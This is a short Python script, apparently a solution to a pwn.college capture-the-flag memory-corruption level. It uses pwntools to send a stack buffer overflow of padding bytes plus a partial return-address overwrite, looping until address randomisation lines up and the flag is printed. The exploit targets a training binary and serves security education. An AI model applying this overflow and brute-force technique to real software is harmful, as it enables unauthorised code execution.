from pwn import *


while True:
    p = process("/challenge/babymem_level7.0")
    #context.terminal = ['tmux', 'splitw', '-h']
    #p = gdb.debug("/challenge/babymem_level6.1", gdbscript='continue')
    p.sendline(b"255")
    # cont = p.recvline(keepends="False")
    # cont = cont.decode()
    # print(cont)
    # if cont.startswith("Our stack pointer points to"):
    #     print("xxxx")
    #     rbp_addr = cont[cont.find("0x", cont.find("base pointer points")): cont.find(".")]
    #     break

    rbp_addr = 0x1f3a
    s=b"A"*(13*8)+rbp_addr.to_bytes(2,"little")
    p.send(s)
    all = p.recvall()
    p.close()
    all = all.decode()
    print(all)
    if all.find("pwn.college{")!=-1:
        break


# print(s)

# fd = open("ttt-raw","wb+")
# fd.write(s)
# fd.close()
# os.system("cat ttt-raw | /challenge/babymem_level6.0")
0x00005f803a23e812 -0x2812 + 0x1f3a